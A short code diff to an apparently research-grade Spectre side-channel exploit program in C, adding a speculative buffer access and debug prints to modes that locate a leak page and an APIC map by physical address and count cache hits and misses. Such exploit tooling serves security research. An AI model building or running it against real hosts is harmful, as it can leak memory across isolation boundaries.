@@ -235,6 +235,7 @@ int main(int argc, char *argv[argc]) {
   if (!strcmp(argv[1], "determine")) {
     *(uint64_t *)leak_page = page_value;
     getchar();
+    access_buffer_with_spectre(leak_page, 1, 1);
     *(uint64_t *)leak_page = 0;
   } else if (!strcmp(argv[1], "calc_min")) {
     if (argc <= 3) {
@@ -254,6 +255,7 @@ int main(int argc, char *argv[argc]) {
       err(errno, "Could not parse phys addr of apic map");
     }
 
+    printf("Leak page addr: %lx\tAPIC map addr: %lx\n", leak_page_addr, apic_map_addr);
     size_t min = calculate_min(leak_page_addr, apic_map_addr);
     printf("Min: %ld (or 0x%lx)\n", min, min);
   } else if (!strcmp(argv[1], "test_spectre")) {
@@ -269,8 +271,11 @@ int main(int argc, char *argv[argc]) {
     }
 
     const size_t iterations = 10000;
+    printf("Running with min %lx\n", ~min);
     size_t miss = access_buffer_with_spectre(leak_page, ~min, iterations);
+    printf("Running with min %lx\n", min);
     size_t hit = access_buffer_with_spectre(leak_page, min, iterations);
+
     printf("Miss: %ld\tHit: %ld\n", miss, hit);
   } else if (!strcmp(argv[1], "find_min")) {
     size_t min = find_min(leak_page);
